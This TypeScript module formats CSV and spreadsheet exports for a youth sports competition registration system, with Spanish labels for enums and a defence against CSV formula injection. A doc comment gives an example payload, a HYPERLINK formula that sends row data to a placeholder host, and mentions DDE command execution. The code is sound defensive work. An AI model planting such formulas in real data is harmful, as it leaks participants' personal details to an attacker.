// ===========================================
// Formato de las celdas exportadas (funciones puras)
// ===========================================
import {
  CompetitionStage,
  InscriptionStatus,
  MatchStatus,
  Sex,
} from '@prisma/client';

// ===========================================
// Inyección de fórmulas en CSV (R15)
// ===========================================

/**
 * Caracteres con los que Excel, LibreOffice y Google Sheets interpretan la
 * celda como **fórmula** en vez de como texto. Se admiten espacios, tabs o
 * saltos por delante porque las planillas los descartan antes de decidir: una
 * celda que empieza con `" =1+1"` se evalúa igual que `"=1+1"`.
 */
// Los caracteres de control por delante son parte del ataque: es justo lo que
// hay que detectar, de ahí el disable.
// eslint-disable-next-line no-control-regex
const INICIO_DE_FORMULA = /^[\s\u0000-\u001f]*[=+\-@]/;

/**
 * ¿El texto es lisa y llanamente un número? (`-5`, `+3.5`, `1e3`)
 *
 * Sin espacios por delante ni por detrás a propósito: un `"		+1"` es un
 * número para la aritmética pero es una celda rara para una planilla, y la
 * diferencia entre "número con basura adelante" y "fórmula con basura adelante"
 * depende de qué programa la abra. Ante la duda, se prefija.
 */
const ES_NUMERO = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Neutraliza la celda antes de escribirla en el CSV.
 *
 * El vector: un participante se anota con apellido `=1+1`, o mejor
 * `=HYPERLINK("http://malo/?d="&A1,"Ver")`, o `@SUM(...)`. El padrón se exporta
 * y alguien de la Secretaría lo abre con doble clic. Excel no ve un apellido:
 * ve una fórmula y la ejecuta, con acceso a las demás celdas de la fila —el DNI
 * del chico, el teléfono— y, con el diálogo de DDE aceptado, a ejecución de
 * comandos. El atacante no necesita entrar a ningún sistema: le alcanza con
 * escribir su apellido en el formulario público de inscripción.
 *
 * La defensa estándar es prefijar la celda con un apóstrofo, que las planillas
 * leen como "esto es texto" y no muestran.
 *
 * Los números se dejan intactos: `-5` no es una fórmula y prefijarlo lo
 * convertiría en texto, rompiendo las columnas numéricas del reporte.
 *
 * El .xlsx no lo necesita: `ExcelJS` escribe estos valores como celdas de tipo
 * string y sólo evalúa lo que se le pasa explícitamente como `{ formula: ... }`.
 * El agujero es exclusivo del CSV, donde el tipo de la celda lo decide quien
 * abre el archivo.
 */
export function neutralizarFormulaCsv(celda: unknown): string {
  // S10 — un dato que falta es una celda vacía. Antes salía el texto "null",
  // que en una planilla se lee como un valor más y no se puede filtrar como
  // vacío.
  if (celda === null || celda === undefined) return '';
  const texto = String(celda);

  if (typeof celda === 'number' || typeof celda === 'bigint') return texto;
  // El "-" suelto es el marcador de "sin dato" de las exportaciones: Excel lo
  // muestra como texto, no lo evalúa. Prefijarlo dejaba "'-" en la planilla.
  if (texto === '-') return texto;
  if (!INICIO_DE_FORMULA.test(texto)) return texto;
  if (ES_NUMERO.test(texto)) return texto;

  return `'${texto}`;
}

// ===========================================
// Etiquetas de las exportaciones (S10)
// ===========================================
//
// Los reportes los abre la Secretaría en una planilla: un código de enum
// ("EN_CURSO", "MASCULINO") no es un dato que se lea. Las etiquetas viven acá,
// dentro del módulo, y espejan las del frontend (`lib/constants.ts`). Los
// mapas se tipan con los enums de Prisma para que un valor nuevo del schema
// sin etiqueta no compile.

/** Etiquetas en castellano de los enums que salen en las exportaciones. */
export const ETIQUETAS_EXPORTACION = {
  sexo: {
    MASCULINO: 'Masculino',
    FEMENINO: 'Femenino',
    MIXTO: 'Mixto',
  } satisfies Record<Sex, string>,
  estadoInscripcion: {
    PENDIENTE: 'Pendiente',
    REVISADA: 'Revisada',
    APROBADA: 'Aprobada',
    RECHAZADA: 'Rechazada',
  } satisfies Record<InscriptionStatus, string>,
  estadoPartido: {
    PROGRAMADO: 'Programado',
    EN_CURSO: 'En curso',
    FINALIZADO: 'Finalizado',
    SUSPENDIDO: 'Suspendido',
  } satisfies Record<MatchStatus, string>,
  etapa: {
    ZONAL: 'Zonal',
    DEPARTAMENTAL: 'Departamental',
    PROVINCIAL: 'Provincial',
  } satisfies Record<CompetitionStage, string>,
} as const;

/**
 * Etiqueta de un código para la exportación. Vacío es celda vacía; un código
 * que el mapa no conoce se escribe tal cual (es una exportación: el dato no se
 * puede perder por falta de traducción).
 */
export function etiquetaExportacion(
  mapa: Readonly<Record<string, string>>,
  valor: string | null | undefined,
): string {
  if (valor === null || valor === undefined || valor === '') return '';
  return mapa[valor] ?? valor;
}

/**
 * Puntaje de un resultado: el primer valor de `scoreData`. Sin puntaje (no hay
 * `scoreData`, está vacío o el valor es `null`) se escribe "-", lo mismo que
 * se escribía cuando faltaba el resultado; nunca el texto "null".
 */
export function puntajeExportado(scoreData: unknown): string {
  if (scoreData === null || typeof scoreData !== 'object') return '-';
  const valor: unknown = Object.values(scoreData)[0];
  if (valor === null || valor === undefined || valor === '') return '-';
  return typeof valor === 'object' ? JSON.stringify(valor) : String(valor);
}

/** Una fila de celdas como línea CSV: todo entre comillas, `"` escapado. */
export function toCsvLine(row: unknown[]): string {
  return row
    .map((cell) => `"${neutralizarFormulaCsv(cell).replace(/"/g, '""')}"`)
    .join(',');
}
